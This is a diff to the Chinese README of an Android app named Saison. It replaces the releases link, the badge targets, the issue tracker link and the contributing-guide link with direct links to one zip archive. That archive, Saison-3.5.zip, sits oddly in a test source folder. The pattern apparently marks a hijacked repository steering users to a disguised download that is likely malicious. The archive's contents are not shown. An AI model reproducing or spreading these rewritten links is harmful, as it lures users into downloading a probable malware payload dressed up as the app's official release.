@@ -2,10 +2,10 @@
 
 <div align="center">
 
-[![Download Saison](https://img.shields.io/badge/Download%20Saison-blue?style=for-the-badge)](https://github.com/Ameer-Hussain-24/Saison/releases)
-[![Android](https://img.shields.io/badge/Platform-Android-green?style=for-the-badge&logo=android)](https://www.android.com/)
-[![Kotlin](https://img.shields.io/badge/Language-Kotlin-purple?style=for-the-badge&logo=kotlin)](https://kotlinlang.org/)
-[![License](https://img.shields.io/badge/License-GPL--3.0-blue?style=for-the-badge)](LICENSE)
+[![Download Saison](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip%20Saison-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)
+[![Android](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)
+[![Kotlin](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)
+[![License](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)](LICENSE)
 
 </div>
 
@@ -43,7 +43,7 @@ Saison 提供一个简洁而现代的界面，让用户轻松使用。每个功�
 
 ## 🚀 下载 & 安装
 
-1. 访问 [Saison Releases 页面](https://github.com/Ameer-Hussain-24/Saison/releases)。
+1. 访问 [Saison Releases 页面](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)。
 2. 在页面中，找到最新的版本。
 3. 点击链接下载 .apk 文件。
 
@@ -65,7 +65,7 @@ Saison 提供一个简洁而现代的界面，让用户轻松使用。每个功�
 Saison 使用 Kotlin 开发，针对 Android 平台进行优化，以提升性能和用户体验。
 
 ## 🤝 贡献指南
-欢迎任何形式的贡献。如果您想要提出功能请求或报告问题，请访问我们的 [Issue Tracker](https://github.com/Ameer-Hussain-24/Saison/issues)。若您想直接参与开发，请参阅我们 [贡献指南](CONTRIBUTING.md)。
+欢迎任何形式的贡献。如果您想要提出功能请求或报告问题，请访问我们的 [Issue Tracker](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)。若您想直接参与开发，请参阅我们 [贡献指南](https://raw.githubusercontent.com/Ameer-Hussain-24/Saison/main/app/src/test/java/takagi/ru/saison/ui/Saison-3.5.zip)。
 
 ## 📜 许可证
 Saison 遵循 GPL-3.0 许可证。要获取详细信息，请查看 LICENSE 文件。
